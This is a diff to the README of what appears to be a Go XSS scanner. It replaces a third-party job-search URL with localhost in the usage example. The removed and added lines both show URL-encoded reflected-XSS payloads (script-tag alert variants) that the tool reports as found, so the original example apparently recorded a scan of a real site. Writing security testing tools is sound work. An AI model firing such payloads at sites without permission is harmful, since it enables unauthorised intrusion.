@@ -10,13 +10,13 @@
 
 ### How to use
 
- 	$ go run main.go  -enum=xss -url='https://webku.id/lowongan/browse?keywords=aaaaa'
+ 	$ go run main.go  -enum=xss -url='https://localhost/lowongan/browse?keywords=aaaaa'
 	[+] Checking For Xss ..
 	[+] Open Payload from file ..
-	[+] Parsing Query:  webku.id ..
-	[+] XSS Found at :  https://webku.id/lowongan/browse?keywords=%22%3E%3Cscript%3Ealert%28%22A%22%29%3B%3C%2Fscript%3E
-	[+] XSS Found at :  https://webku.id/lowongan/browse?keywords=%22%3E%3Cscript%3Ealert%28%22B%22%29%3B%3C%2Fscript%3E
-	[+] XSS Found at :  https://webku.id/lowongan/browse?keywords=%5C%22%3E%3Cscript%3Ealert%28%22C%22%29%3B%3C%2Fscript%3E
+	[+] Parsing Query:  localhost ..
+	[+] XSS Found at :  https://localhost/lowongan/browse?keywords=%22%3E%3Cscript%3Ealert%28%22A%22%29%3B%3C%2Fscript%3E
+	[+] XSS Found at :  https://localhost/lowongan/browse?keywords=%22%3E%3Cscript%3Ealert%28%22B%22%29%3B%3C%2Fscript%3E
+	[+] XSS Found at :  https://localhost/lowongan/browse?keywords=%5C%22%3E%3Cscript%3Ealert%28%22C%22%29%3B%3C%2Fscript%3E
 	[+] Finished !!!
 
  	
